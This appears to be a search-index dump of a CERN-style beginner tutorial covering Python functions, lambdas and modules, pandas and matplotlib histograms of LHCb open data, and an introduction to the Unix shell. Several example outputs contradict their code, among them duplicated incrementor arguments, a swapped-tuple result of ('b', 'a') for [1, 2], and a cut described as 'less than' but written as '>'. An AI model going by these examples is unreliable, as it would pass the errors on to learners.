If we called make_incrementor(3), then increment has\nthe value 3, and we can fill in the returned method in our heads.\ndef func(var):\n    return var + 3\n\nSo when we call this method, we’ll get back what we put in, but plus 3.\n>>> increment_one = make_incrementator(1)\n>>> increment_two = make_incrementator(1)\n>>> print increment_one(42), increment_two(42)\n43 44\n>>> print make_incrementator(3)(42) # Do it in one go!\n45\n\n\nWhat if you like to accept an arbitrary number of arguments? For example, we\ncan also write a total method that takes two arguments.\n>>> def total(x, y):\n...     \"\"\"Return the sum of the arguments.\"\"\"\n...     return x + y\n...\n>>>\n\nBut what if we want to allow the caller to pass more than two arguments? It\nwould be tedious to define many arguments explicitly.\n>>> def total(*args):\n...     \"\"\"Return the sum of the arguments.\"\"\"\n...     # For seeing what `*` does\n...     print 'Got {0} arguments: {1}'.format(len(args), args)\n...     return sum(args)\n...\n>>> total(1)\nGot 1 arguments: (1,)\n1\n>>> total(1, 2)\nGot 2 arguments: (1, 2)\n3\n>>> total(1, 2, 3)\nGot 3 arguments: (1, 2, 3)\n6\n\nThe *args syntax says “stuff any arguments into a tuple and call it args”.\nThis let’s us capture any number of arguments. As args is a tuple, when could\nloop over it, access a specific element, and so on.\nWe can also expand lists into separate arguments in with the same syntax when\ncalling a method.\n>>> def reverse_args(x, y):\n...     return y, x\n...\n>>> l = [1, 2]\n>>> reverse_args(l)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: reverse_args() takes exactly 2 arguments (1 given)\n>>> reverse_args(*l)\n('b', 'a')\n\nA similar syntax exists for keyword arguments.\n>>> def ages(**people):\n...     \"\"\"Print people's information.\"\"\"\n...     # For seeing what `**` does\n...     print 'Got {0} arguments: {1}'.format(len(people), people)\n...     for person in people:\n...         print 'Person {0} is {1}'.format(person, people[person])\n...\n>>> ages(steve=31)\nGot 1 arguments: {'steve': 31}\nPerson steve is 31\n>>> ages(steve=31, helen=70, zorblax=9963)\nGot 3 arguments: {'steve': 31, 'zorblax': 9963, 'helen': 70}\nPerson steve is 31\nPerson zorblax is 9963\nPerson helen is 70\n\nAs you can see from the debug print statement, **people is a dictionary\ncontaining the keyword arguments we passed to the ages method. The keys of\nthe dictionary are the names of the argument as strings, and the values are the\nvalues of the arguments. Just like for the * syntax, ** can also be used to\nexpand a dictionary into keyword arguments.\n>>> d = {'thor': 5000, 'yoda': -1}\n>>> ages(**d)\nGot 2 arguments: {'yoda': -1, 'thor': 5000}\nPerson yoda is -1\nPerson thor is 5000\n\nIt’s worth remembering thing because dictionaries are unordered, and the **\nsyntax effectively creates a dictionary, the order of the keyword arguments\nused to call the method are not necessarily the same as those that the function\nblock sees!\n The most generic methodThe most generic method would take any number of positional arguments and any\nnumber of keyword arguments. What would this method look like?\n SolutionClick to expandIt would use both * and ** syntax in defining the arguments.\n>>> def generic(*args, **kwargs):\n...     print 'Got args: {0}'.format(args)\n...     print 'Got kwargs: {0}'.format(kwargs)\n...\n>>> d = {'bing': 'baz'}\n>>> generic(1, 2, 'abc', foo='bar', **d)\nGot args: (1, 2, 'abc')\nGot kwargs: {'bing': 'baz', 'foo': 'bar'}\n\n\nInline methods\nSome methods take other methods as arguments, like the built-in map method.\n>>> map(str, range(5))\n['0', '1', '2', '3', '4']\n\nmap takes a function and a list, and applies the function to each element in\nthe list. It returns a new list with the results. We can define and then pass\nour own functions.\n>>> def cube(x):\n...     \"\"\"Return the third power of x.\"\"\"\n...     return x*x*x\n...\n>>> map(cube, range(5))\n[0, 1, 8, 27, 64]\n\nFor such a simple method, this is a lot of typing! We can use lambda to\ndefine such simple methods inline.\n>>> map(lambda x: x*x*x, range(5))\n[0, 1, 8, 27, 64]\n\nThe syntax of defining a lambda is like this:\nlambda : \n is a command-separate set of variables that the lambda can take as\narguments, and  is the code that is run. A lambda\nautomatically returns whatever the result of the expression is, you don’t need\na return (the return is implicit).\nWriting a lambda statement defines a method, which you can capture as a\nvariable just like any other object.\n>>> div2 = lambda x: x/2\n>>> div2\n at 0x7fc6b2207758>\n>>> map(div2, range(5))\n[0.0, 0.5, 1.0, 1.5, 2.0]\n\n Sum in quadratureWrite a method that accepts an arbitrary number of arguments, and returns the\nsum of the arguments computed in quadrature. A “sum in quadrature” is the\nsquare root of the sum of the squares of each number. You should use lambda\nto define a squaring and a square root function, and map to apply the\nsquaring method.\n SolutionClick to expandWe need a little square root method and a method to square its input.\n>>> square = lambda x: x*x\n>>> sqrt = lambda x: x**0.5\n\nWe then define a method that can accept any number of arguments using the\n*args syntax, and use map to call the square method on the list of\narguments. Then we can call sum on the result, and then sqrt.\n>>> def quadrature(*args):\n...     \"\"\"Return the sum in quadrature of the arguments.\"\"\"\n...     return sqrt(sum(map(square, args)))\n...\n>>> quadrature(1, 1) # should be equal to sqrt(2)\n1.4142135623730951\n>>> 2**0.5\n1.4142135623730951\n\n\nAnother use case for lambda is the built-in filter method (see:\nhelp(filter)).\n>>> filter(lambda x: x % 2 == 0, range(10))\n[0, 2, 4, 6, 8]\n\n List comprehensionHow would you rewrite the filter example above using a list comprehension?\n SolutionClick to expand>>> [ x for x in range(10) if x % 2 == 0 ]\n[0, 2, 4, 6, 8]\n\n\nGenerally, you should only use lambda methods to define little throw-away\nmethods. The main downside with using them is that you can’t attach a docstring\nto them, and they become unwieldy when there’s complex logic.\n"},"python/scripting.html":{"url":"python/scripting.html","title":"Scripting","keywords":"","body":"Scripting\nOK, so we’ve spent quite a long time in Python shells, but we can quit, we can\nonly get back our work line-by-line (with IPython’s history).

We have already met the maths module, but\ndid not talk about how we started using it.\n>>> import math\n>>> math\n\n>>> math.pi\n3.141592653589793\n>>> math.sin(1)\n0.8414709848078965\n\nThe path after from might look different on your computer.\nSo, math is a module, and this seems to behave a lot like other objects we\nhave met: it is a container with properties and methods attached that we can\naccess with the dot operator .. Actually, that is pretty much all there is to\nthem.\nUsing modules into your code: import\nThe keyword import, usually specified at the beginning of your source code, is\nused to tell Python what modules you want to make available to your current\ncode.\nThere are different ways of specifying an import. The one we have seen already\nsimply makes the module available to you:\n>>> import random\n>>> random.uniform(0, 1)\n0.5877109428927353\n\nThe module random contains functions useful for random number generation: with\nthe import above, we have made the random module accessible, and everything\nwithin that module is accessible via the syntax random.. For the record,\nthe uniform(x,y) method returns a pseudo-random number within the range\n[0,1][0,1][0,1].\nSometimes you want to make only one or more things from a given module\naccessible: Python gives you the ability to import just those:\n>>> from random import uniform, choice\n>>> uniform(0, 1)\n0.4059007502204043\n>>> choice([ 33, 56, 42, -1 ])\n42\n\nIn this case the uniform and choice names are available directly, i.e.\nwithout using the random prefix. All other functions in the random module\nare not available in this case. For the record, the choice function returns a\nrandom element from a given collection.\nAnother option is to import all functions of a certain module and make them\navailable without a prefix:\n>>> from random import *\n>>> gauss(0, 1)\n-1.639334770284028\n\nThis is quite not recommended as you generally do not know what is the extent\nof what you are importing and you might end up with name clashes between your\ncurrent code and the imported module.\nLastly, it is possible to import modules, or specific names from a module under\nan alias:\n>>> from random import uniform as uni\n>>> uni(0, 1)\n0.7288973406605329\n>>> import numpy as np\nnp.arccos(1)\n0.0\n\nThis option is useful when you need to assign shorter aliases to names you will\nuse frequently. In particular, the alias np for the numpy module will be\nencountered a lot.\nNote that modules can have submodules, specified with extra dots .:\n>>> from os.path import abspath\n>>> abspath('..')\n'/afs/cern.ch/user/d'\n\nWhen importing a module, its submodules are not available by default and you\nmust import them explicitly:\n>>> import os\n>>> os.getcwd()\n'/afs/cern.ch/user/d/dberzano'\n>>> import os.path\n>>> os.path.basename(os.getcwd())\n'dberzano'\n\nNote that due to the current Python implementation of the os module, os.path\nfunctions are actually available even without importing os.path but just\nos, but you cannot rely on this implementation which represents an exception\nand might change in the future. Always import submodules explicitly!\nIt is also possible to import several modules with a single import command:\n>>> import os, sys, math\n\nbut this is not recommended by the Python style guide, which\nsuggests to use several import statements, one per module, as it improves\nreadability:\n>>> import os\n>>> import sys\n>>> import math\n\nIf you need to import several names from a single modules, you can split an import\nfunction over multiple lines:\n>>> from math import (\n...     exp,\n...     log,\n...     e,\n...     floor\n... )\n>>> floor(exp(log(e)))\n2.0\n\nThe standard library\nThe set of things that Python comes with, from all of the types of objects to\nall of the different modules, is called the standard library. It is\nrecommend to browse through the standard library documentation to see what is\navailable: Python is rich of standard modules, and you should reuse them as much\nas possible instead of rewriting code on your own.\nSome of the categories for which standard modules are available are:\n\nprocessing paths\ndate and time manipulation\nmathematical functions\nparsing of certain file formats\nsupport for multiple processes and threads\n...\n\nUse standard Python library modules with confidence: being part of any standard\nPython distribution, your code will be easily portable.\nModules from PyPi\nMany external modules can be found on PyPi. Some of those modules are\nalready part of some Python distributons (such as Anaconda, which\ncomes with more than a thousand science-oriented modules preinstalled).\nIf a certain module you need is not available on your distribution you can\neasily install it with the pip shell command. Since you do not have write\naccess to a standard Python installation's directories, pip allows you to\ninstall modules only for yourself, under your current user's home directory.\nIt is recommended to set up in your shell startup script (such as ~/.bashrc)\nthe following two lines telling once for all where to install and search for\nPython user modules:\nexport PYTHONUSERBASE=$HOME/.local\nexport PATH=$PYTHONUSERBASE/bin:$PATH\n\nOnce you have done that, close your current terminal window and open a new one,\nand you will be ready to use pip. We will see in a later lesson how to install\nthe root_pandas module with:\npip install --user root_pandas\n\nWrite your first Python module\nThe simplest Python module you can write is just a .py file with some\nfunctions inside:\n# myfirstmodule.py\n\ndef one():\n    print('this is my first function')\n\ndef two():\n    print('this is my second function')\n\nYou can now fire an ipython shell and use those functions right away:\n>>> import myfirstmodule\n>>> myfirstmodule.one()\nthis is my first function\n>>> myfirstmodule.two()\nthis is my second function\n\nBy simply calling the file myfirstmodule.py we have made it available as a\nmodule named myfirstmodule - given that the file is in the same directory\nwhere we have launched the Python interpreter.\n Module names restrictionsNote that you cannot pick any name you want for a module! From the [Python\nstyle guide][pep8-modulenames], we gather that we should use \"short,\nall-lowercase names\". As a matter of fact, if we used dashes in the file name,\nwe would have ended up with a syntax error while trying to load it:\n>>> import my-first-module\n  File \"\", line 1\n    import my-first-module\n             ^\nSyntaxError: invalid syntax\n\nPython treats - as a minus and does not understand your intentions.\n\nWrite a structured module\nLet's now create a more structured module, with submodules and different files.\nWe can start from the myfirstmodule.py file and create a directory structure:\n$ mkdir yabba\n$ cp myfirstmodule.py yabba/__init__.py\n\nWe have reused the same file created before, copied it into a directory called\nyabba and renamed it to __init__.py. The double underscore should ring a\nbell: this is a Python special name, and it represents the \"main file\" within\na module, whereas the directory name now represents the module name.\nThis means that our module is called yabba, and if we import it, functions\nfrom __init__.py will be available:\n>>> import myfirstmodule\n>>> myfirstmodule.one()\nthis is my first function\n>>> myfirstmodule.two()\nthis is my second function\n\nWe can create an additional file inside the yabba directory, say\nyabba/extra.py and have more functions there:\n# yabba/extra.py\n\ndef three():\n  print 'this function will return the number three'\n  return 3\n\nWe have effectively made extra a submodule of yabba. Let's try:\n>>> import yabba\n>>> filter(lambda x: not x.startswith('__'), dir(yabba))\n['one', 'two']\n>>> import yabba.extra\n>>> yabba.extra.three()\nyabba.extra.three()\nthis function will return the number three\n3\n\n What have I done with the filter function?We have used the filter function above to list the functions we have defined\nin our module. Can you describe in detail what the commands above do?\n SolutionClick to expandThe dir(module) command lists all names (not necessarily functions, not\nnecessarily defined by us) contained in a given module. We have used the\nfilter() command to filter out all names starting with two underscores. Every\nitem returned by dir() is passed as x to the lambda function which returns\nTrue or False, determining whether the filter() function should keep or\ndiscard the current element.\n\nRun a module\nWe can make a Python module that can be easily imported by other Python\nprograms, but we can also make it in a way that it can be run directly as a\nPython script.\nLet's write this special module and call it runnable.py:\n#!/usr/bin/env python\n\nlong_format = False\n\ndef print_label(label, msg):\n    if long_format:\n        out = '{0}: {1}'.format(label.upper(), str(msg))\n    else:\n        out = '{0}-{1}'.format(label[0].upper(), str(msg))\n    print out\n\ndef debug(msg):\n    print_label('debug', msg)\n\ndef warning(msg):\n    print_label('warning', msg)\n\nif __name__ == '__main__':\n    print '*** Testing print functions ***'\n    debug('This is a debug message')\n    long_format = True\n    warning('This is a warning message with a long label')\nelse:\n    print 'Module {0} is being imported'.format(__name__)\n\nNow let's make it executable:\n$ chmod +x runnable.py\n\nIt can be now run as a normal executable from your shell:\n$ ./runnable.py\n*** Testing print functions ***\nD-This is a debug message\nWARNING: This is a warning message with a long label\nThere are two outstanding notions here. First off, the first line is a\n\"shebang\": it really has to be the first line in a file (it cannot be the\nsecond, or \"one of the first\", or the first non-empty) and it basically tells\nyour shell that your executable text file has to be interpreted by the current\nPython interpreter. Just use this line as it is.\nSecondly, we notice we have a peculiar if condition with a block that gets\nexecuted when we run the file. __name__ is a special internal Python variable\nwhich is set to the module name in case the module is imported. When the module\nis ran, it is set to the special value \"__main__\".\nThe else: condition we have added is just to show what happens when you import\nthe module instead:\n>>> import runnable\nModule runnable is being imported\n>>> runnable.warning('hey I can use it from here too')\nW-hey I can use it from here too\n\nNow, the if condition is not necessary when you want to run the module - those\nlines in the if block will be executed anyway. It is however used to prevent\nsome lines from being executed when you import the file as a module.\nPlease also note that module imports are typically silent, so the else:\ncondition with a printout would not exist in real life.\n"},"python/learning.html":{"url":"python/learning.html","title":"Learning more","keywords":"","body":"Learning more\nLearning Python is like learning… well, like learning a language! You must \npractice reading and writing regularly, and as you do you’ll become more and \nmore comfortable, starting to get a feeling for how things work, and how to \neffectively express yourself.\nProgramming is a career in and of itself, so as physicists we have twice as \nmuch work to do! It takes people many years to get comfortable with any \nlanguage, so try not to get too frustrated if things seem complicated at the \nbeginning. It gets better!\nWhen you do get stuck, ask friends and colleagues for help. One of the great \nthings about Python is that many people around the world use it, and it’s very \npopular in high energy physics, so you likely already know someone who can help \nsolve your problem. Working on code with others is a great way to learn, as you \ncan see how other people do things, and find out tricks you didn’t know about.\nBeyond other people, Google is a powerful ally. Knowing how to express your \nproblem is important in getting the best answers quickly. Generally, including \na few words as possible is a good idea, like “python dictionary delete \nkey”, or “python read file lines”.\nStack Overflow is an excellent resource, with \ncommunity-provided answers for many programming-related questions. Most \nproblems you encounter will already be answered there, and often the answers \nare quite didactic, providing context and further reading, beyond just posting \nthe code that answers the question (these answers aren’t always the ones marked \nas the ‘best answer’, and don’t always have the most votes).\nExploring Python\nThe Python standard library is a treasure-trove of useful objects and methods. \nWe’ve gone through a tiny subset of them here, some others that might be useful \nto you are:\n\nos: Operating system functions to manipulate and query your machine and the \nfile system, like os.mkdir to make directories and os.rename.\ntempfile: create files and directories in a temporary location, like\n/tmp, e.g. tempfile.mkdtemp.\nglob: File name matching, to be able to do things like ls folder/*.txt in \nPython with glob.glob('folder/*.txt').\nsubprocess: Call shell commands with subprocess.call(['ls', '-l', '-a']).\ntime: Get the current time with time.localtime().tm_hour.\ncollections: Use collections.namedtuple to create your own property-only\nobjects.>>> import collections\n>>> Coordinate = collections.namedtuple('Coordinate', ['x', 'y'])\n>>> coord = Coordinate(4.5, 2.0)\n>>> coord.y\n2.0\n>>> x, y = coord\n>>> x\n4.5\n\nUse collections.OrderedDict for ordered dictionaries.>>> d = {'foo': 'bar', 123: 321, 'hero': 'thor'}\n>>> for key, value in d.items():\n...     print key, value\n...\n123 321\nfoo bar\nhero thor\n>>> d = collections.OrderedDict([('foo', 'bar'), (123, 321)])\n>>> d.update([('hero', 'thor')])\n>>> for key, value in d.items():\n...     print key, value\n...\nfoo bar\n123 321\nhero thor\n\ncollections.defaultdict is useful for creating dictionaries that will create \nautomatically create values when a previously undefined key is accessed.>>> d = collections.defaultdict(int)\n>>> d['foo'] += 1\n>>> print d, d['foo'], d['bar']\ndefaultdict(, {'foo': 1}) 1 0\n\n\n\nConventional coding\n‘Pythonic code’ is code that follows the conventions of the wider Python \ncommunity. Lots of people write Python, and by following certain stylistic \nconventions it makes it easier for everyone to read each other’s code (as they \nsay: ‘you spend 90% of your time reading code, and 10% writing it’).\nPythonic style emphasises clean, readable code, with consistent formatting and \nuseful comments. The most important thing is to be consistent. You can consult \nPEP8, the official Python style recommendations, if you're unsure or to \nwant to settle a dispute like lower_case_functions versus \nupperCaseFunctions. Which of these two methods is easier to read?\nimport time\n\n\ndef myFunc(x,y,verbose = True, fast='yes'):\n    \"\"\"Do the thing.\"\"\"\n    z=( x *y ) /2\n    if verbose == False:\n        print x,y, z\n    if not fast:\n        time.sleep( 1 )\n    return  z* z\n\n\ndef my_func(x, y, verbose=True, fast=True):\n    \"\"\"Return ((x*y)/2)**2.\n\n    Keyword arguments:\n    x, y -- Values used in the computation\n    verbose -- Print computation information\n    fast -- If True, sleep for 1 second before returning\n    \"\"\"\n    z = (x*y)/2\n\n    if verbose:\n        print x, y, z\n    # Should probably remove this functionality\n    if not fast:\n        time.sleep(1)\n\n    return z*z\n\nThe Zen of Python summarises the ‘philosophy’ that the language tries to \nfollow. See what you think!\n>>> import this\n\n\n“There should be one-- and preferably only one --obvious way to do it”\n\nIf there isn't, you might be trying to come at a problem the wrong way.\n"},"python/first_histogram.html":{"url":"python/first_histogram.html","title":"Making your first histogram","keywords":"","body":"Making your first histogram\nIn this section we are going to make our first plots using Python. For this we\nwill use some public LHCb data for B+→H+H+H− B^+ \\rightarrow H^+ H^+ H^- B​+​​→H​+​​H​+​​H​−​​ from the\nCERN open data portal.

While LCG\nprovides a lot of useful packages there are sometimes things missing.\nFortunately most packages can be easily installed into ~/.local/ using pip\nwith the --user flag. In this lesson we will be using root_pandas which can\nbe installed using:\npip install --user root_pandas\n\nSome packages, such as flake8, provide executables\nwhich are useful to have included on your PATH so they are available without\nspecifying their absolute path. This can be done by running\nexport PATH=$(python -m site --user-base)/bin:$PATH\n\nsee that bash lesson for more details about the PATH variable.\nWe can even upgrade already installed packages using:\npip install --user matplotlib --upgrade\n\nAs LCG uses PYTHONPATH to make packages available any packages it provides\nhave higher priority that the user installed package. In order to make it so\nthe package installed with --user takes precedent you must run\nexport PYTHONPATH=$(python -m site --user-site):$PYTHONPATH\n\nevery time you run the source command above. This is only needed when\ninstalling user packages to upgrade LCG provided ones.\n\nAll ROOT methods made available in Python using a set of automatically generated\nbindings, known as PyROOT. These are all available by using import ROOT. For\nexample if we want to create a TFile using the aforementioned data we can\nlaunch ipython and run:\nIn [1]: import ROOT\nIn [2]: filename = 'root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root'\nIn [3]: my_file = ROOT.TFile.Open(filename)\nIn [4]: my_file.ls()\n\nTNetXNGFile**       root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root\n TNetXNGFile*       root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root\n  KEY: TTree    DecayTree;1 Tree continaing data for B- --> h-h+h- decays\nIn [5]: my_tree = my_file.Get('DecayTree')\nIn [6]: my_tree.Print()\n******************************************************************************\n*Tree    :DecayTree : Tree continaing data for B- --> h-h+h- decays          *\n*Entries :  5135823 : Total =       945201357 bytes  File  Size =  666480138 *\n*        :          : Tree compression factor =   1.42                       *\n******************************************************************************\nWhile it is very useful to be able to access all the ROOT functionality in this\nway, they are often slow and tedious to use. Luckily people have built more\nspecialised bindings to allow ROOT to be used in a more pythonic way.\nPandas\npandas is a library for doing data analysis on\ntabular data, using a data structure known as dataframes. These typically have\ncolumns with labels (like TLeafs in a TTree) with many rows. The\nroot_pandas package we installed earlier can be used to create a pandas\nDataFrame from a root file:\nIn [7]: import root_pandas\nIn [8]: df = root_pandas.read_root(filename, key='DecayTree')\n\nWe can then use df.head(5) to see the first 5 rows of the DataFrame:\nIn [9]: df.head(5)\nOut[9]:\n   B_FlightDistance  B_VertexChi2        H1_PX        H1_PY          H1_PZ  \\\n0         25.301004      1.497280   375.284205   831.308481   51820.233718\n1         94.690700      1.383338 -4985.130785  5853.750057  326157.454706\n2          8.284490      5.187101 -1265.456544  2330.050788   90762.658032\n3          5.590769      7.129099  -720.797259  3413.790588   86793.058768\n4          3.013242     10.988701   397.754571  1791.373059   40040.364159\n\nWhile it is nice to be able to view the data is is typically much more useful to\nbe able to apply operations to it in bulk. In this example we have the momentum\ncomponents for each of the child particles in the decay (H1, H2 and H3)\nbut not the transverse momentum. We can however apply expressions to each row\nof the data like so:\nIn [10]: df.eval('sqrt(H2_PX**2 + H2_PY**2)')\nOut [10]: 0          1306.642724\n1           167.578904\n2          1273.457019\n3          1146.299204\n             ...\n5135820     210.430531\n5135821     762.344570\n5135822    1454.471057\ndtype: float64\n\nThis gives us the transverse momentum for each particle as an array, however, we\ncan also create a new column with this information by assigning to the name we\nwant to create and doing the action \"inplace\":\nIn [11]: df.eval('H2_PT = sqrt(H2_PX**2 + H2_PY**2)', inplace=True)\n\n Adding the total B+ meson momentumCreate a new column in the dataframe called B_P for the total momentum of the\nB+ meson.\n SolutionClick to expanddf.eval('B_P = sqrt('\n        '(H1_PX + H2_PX + H3_PX)**2 + '\n        '(H1_PY + H2_PY + H3_PY)**2 + '\n        '(H1_PZ + H2_PZ + H3_PZ)**2'\n        ')', inplace=True)\n\n\nPlotting histograms\nNow we have the momentum of the B+B+B+ meson it would be useful to plot a\nhistogram. We could use ROOT for this but the most popular Python library for\nplotting is known as matplotlib and this is what we\nwill use here. The most common way matplotlib is used is with the pyplot\ninterface imported as plt like so:\nIn [12]: import matplotlib\nIn [13]: matplotlib.use('Agg')  # Force matplotlib to not use any Xwindows backend.\nIn [14]: from matplotlib import pyplot as plt\nIn [15]: plt.hist(df['B_FlightDistance'])\nIn [16]: plt.savefig('B_flight_distance.pdf')\n\n\n Interactive plottingThere are various ways of viewing plots interactively such as:\n\nplt.show() Opens a window with the current plot and pauses the Python\ninterpreter until the window is closed\nplt.ion() Allows plots to be viewed without pausing the Python interpreter\njupyter A web based interface for running various\nlanguages including python in \"notebooks\". If you've used mathematica or\nmatlab before it's a similar interface with code, documentation and plots\nall shown together.\n\n\nIn [17]: import numpy as np\nIn [18]: bins = np.linspace(0, 150, 100)\nIn [19]: plt.hist(df['B_FlightDistance'], bins=bins)\nIn [20]: plt.savefig('B_flight_distance_v2.pdf')\n\n\nThat's not right! The new histogram has been plotted on top of our first one!\nThis is normally useful as it allows us to layer plots on top of each other to\ncompare them. Though in this case we don't want to that so we should first close\nthe previous plot before making our histogram. We should also add axis labels\nand a legend like so:\nIn [21]: plt.close()  # Close the previous plot\n\nIn [22]: plt.hist(df['B_FlightDistance'], bins=bins, histtype='step', label='My data label')\nIn [23]: plt.xlim(bins[0], bins[-1])\nIn [24]: plt.xlabel('Flight distance of $B^+$ meson')\nIn [25]: plt.legend(loc='best')\nIn [26]: plt.savefig('B_flight_distance_v3.pdf')\n\n\nApplying cuts\nWhen analysing data it is often useful to \"throw away\" some data in order to in\norder change the contributions of a sample. Most commonly this is to remove some\nbackground(s) so we can more precisely study a process of interest. This is\nknown as cutting.\nIn pandas we can apply a cut to a DataFrame using the query method. For\nexample to make a new DataFrame containing B+B^+B​+​​ mesons with flight distances\nof less than 15mm we can use:\nIn [27]: df_with_cut = df.query('B_FlightDistance > 15')\n\n Comparing momentum distributionsIt is often useful to compare the effect of a cut on the distribution of another\nvariable. Try to plot a histogram showing the B+ lifetime distribution with and\nwithout a total B+ momentum cut of 100000 MeV.\n SolutionClick to expandbins = np.linspace(0, 150, 100)\ndf_with_cut = df.query('B_P > 100000')\n\nplt.figure()\nplt.hist(df['B_FlightDistance'], bins=bins, histtype='step', normed=True, label='Without cut')\nplt.hist(df_with_cut['B_FlightDistance'], bins=bins, histtype='step', normed=True, label='With 100 GeV momentum cut')\n\nplt.xlim(bins[0], bins[-1])\nplt.xlabel('Total momentum of $B^+$ meson')\nplt.legend(loc='best')\nplt.savefig('B_flight_distance_with_cut_compare.pdf')\n\nHere we also use the normed=True option with plt.hist, this plots the\nnormalised distribution. This is typically more useful when comparing\ndistributions as it make it easier to see differences in the shape without the\nindependently of the total number of events.\n\n\n Comparing momentum distributionsCalculate and plot the B+ meson mass assuming that all three of the child\nhadrons are kaons.\n\n"},"python/further_reading.html":{"url":"python/further_reading.html","title":"Further reading","keywords":"","body":"More advanced topics in Python\nNice standard libraries\n\nos, sys, re, fnmatch, argsparse, subprocess\n\nNice libraries for data analysis\n\nnumpy, pandas, matplotlib\n\nPython and ROOT\n\npyROOT\nroot_numpy\n\n"},"shell/":{"url":"shell/","title":"Introducing the Shell","keywords":"","body":"Introducing the Shell\n Learning Objectives\nExplain how the shell relates to the keyboard, the screen, the operating system, and users' programs.\nExplain when and why command-line interfaces should be used instead of graphical interfaces.\n\n\n PrerequisitesIn this lesson we will use the example data-shell directory to provide a\ncommon set of files that everyone has access to.

The roots of such graphical user interfaces go back\nto Doug Engelbart's work in the 1960s, which you can see in what has been\ncalled \"The Mother of All Demos\".\nThe Command-Line Interface\nGoing back even further,\nthe only way to interact with early computers was to rewire them.\nBut in between,\nfrom the 1950s to the 1980s,\nmost people used line printers.\nThese devices only allowed input and output of the letters, numbers, and punctuation found on a standard keyboard,\nso programming languages and software interfaces had to be designed around that constraint.\nThis kind of interface is called a\ncommand-line interface, or CLI,\nto distinguish it from a\ngraphical user interface, or GUI,\nwhich most people now use.\nThe heart of a CLI is a read-evaluate-print loop, or REPL:\nwhen the user types a command and then presses the Enter (or Return) key,\nthe computer reads it,\nexecutes it,\nand prints its output.\nThe user then types another command,\nand so on until the user logs off.\nThe Shell\nThis description makes it sound as though the user sends commands directly to the computer,\nand the computer sends output directly to the user.\nIn fact,\nthere is usually a program in between called a\ncommand shell.\nWhat the user types goes into the shell,\nwhich then figures out what commands to run and orders the computer to execute them.\n(Note that the shell is called \"the shell\" because it encloses the operating system\nin order to hide some of its complexity and make it simpler to interact with.)\nA shell is a program like any other.\nWhat's special about it is that its job is to run other programs\nrather than to do calculations itself.\nThe most popular Unix shell is Bash,\nthe Bourne Again SHell\n(so-called because it's derived from a shell written by Stephen Bourne).\nBash is the default shell on most modern implementations of Unix\nand in most packages that provide Unix-like tools for Windows.\n Available shells at CERNAt CERN the bash is set as the default shell, however other shells are\nsupported by the CERN IT department and can be set on the account management\npage.\nDespite this, if you want a configuration that \"just works\", using bash is the\nbest option as other shells are sometimes considered a non-standard\nconfiguration.\nRegardless of your default shell you can always use a different shell by running\nthe relevant executable (i.e. bash, tcsh, zsh, ...) after logging in.\n\nWhy bother?\nUsing Bash or any other shell\nsometimes feels more like programming than like using a mouse.\nCommands are terse (often only a couple of characters long),\ntheir names are frequently cryptic,\nand their output is lines of text rather than something visual like a graph.\nOn the other hand,\nwith only a few keystrokes, the shell allows us to combine existing tools into\npowerful pipelines and handle large volumes of data automatically. This automation\nnot only makes us more productive but also improves the reproducibility of our workflows by\nallowing us to repeat them with a few simple commands.\nIn addition, the command line is often the easiest way to interact with remote machines and supercomputers.\nFamiliarity with the shell is near essential to run a variety of specialized tools and resources\nincluding high-performance computing systems.\nAs clusters and cloud computing systems become more popular for scientific data crunching,\nbeing able to interact with the shell is becoming a necessary skill.\nWe can build on the command-line skills covered here\nto tackle a wide range of scientific questions and computational challenges.\nNelle's Pipeline: Starting Point\nNelle Nemo, a marine biologist,\nhas just returned from a six-month survey of the\nNorth Pacific Gyre,\nwhere she has been sampling gelatinous marine life in the\nGreat Pacific Garbage Patch.\nShe has 1520 samples in all and now needs to:\n\nRun each sample through an assay machine\nthat will measure the relative abundance of 300 different proteins.\nThe machine's output for a single sample is\na file with one line for each protein.\nCalculate statistics for each of the proteins separately\nusing a program her supervisor wrote called goostats.\nCompare the statistics for each protein\nwith corresponding statistics for each other protein\nusing a program one of the other graduate students wrote called goodiff.\nWrite up results.\nHer supervisor would really like her to do this by the end of the month\nso that her paper can appear in an upcoming special issue of Aquatic Goo Letters.\n\nIt takes about half an hour for the assay machine to process each sample.\nThe good news is that\nit only takes two minutes to set each one up.\nSince her lab has eight assay machines that she can use in parallel,\nthis step will \"only\" take about two weeks.\nThe bad news is that if she has to run goostats and goodiff by hand,\nshe'll have to enter filenames and click \"OK\" 46,370 times\n(1520 runs of goostats, plus 300*299/2 (half of 300 times 299) runs of goodiff).\nAt 30 seconds each,\nthat will take more than two weeks.\nNot only would she miss her paper deadline,\nthe chances of her typing all of those commands right are practically zero.\nThe next few lessons will explore what she should do instead.\nMore specifically,\nthey explain how she can use a command shell\nto automate the repetitive steps in her processing pipeline\nso that her computer can work 24 hours a day while she writes her paper.\nAs a bonus,\nonce she has put a processing pipeline together,\nshe will be able to use it again whenever she collects more data.\n Key Points\nExplain the similarities and differences between a file and a directory.\nTranslate an absolute path into a relative path and vice versa.\nConstruct absolute and relative paths that identify specific files and directories.\nExplain the steps in the shell's read-run-print cycle.\nIdentify the actual command, flags, and filenames in a command-line call.\nDemonstrate the use of tab completion and explain its advantages.\n\n\nCC BY 4.0 - Based on shell-novice © 2016–2017 Software Carpentry Foundation\n"},"shell/02-filedir.html":{"url":"shell/02-filedir.html","title":"Navigating Files and Directories","keywords":"","body":"Navigating Files and Directories\n Learning Objectives\nExplain the similarities and differences between a file and a directory.\nTranslate an absolute path into a relative path and vice versa.\nConstruct absolute and relative paths that identify specific files and directories.\nExplain the steps in the shell's read-run-print cycle.\nIdentify the actual command, flags, and filenames in a command-line call.\nDemonstrate the use of tab completion, and explain its advantages.\n\n\nThe part of the operating system responsible for managing files and directories\nis called the file system.\nIt organizes our data into files,\nwhich hold information,\nand directories (also called \"folders\"),\nwhich hold files or other directories.\nSeveral commands are frequently used to create, inspect, rename, and delete files and directories.\nTo start exploring them,\nlet's open a shell window:\n Preparation MagicIf you type the command:\nPS1='$ '\ninto your shell, followed by pressing the 'enter' key,\nyour window should look like our example in this lesson.\nThis isn't necessary to follow along (in fact, your prompt may have\nother helpful information you want to know about).  This is up to you!\n\n$\n\nThe dollar sign is a prompt, which shows us that the shell is waiting for input;\nyour shell may use a different character as a prompt and may add information before\nthe prompt. When typing commands, either from these 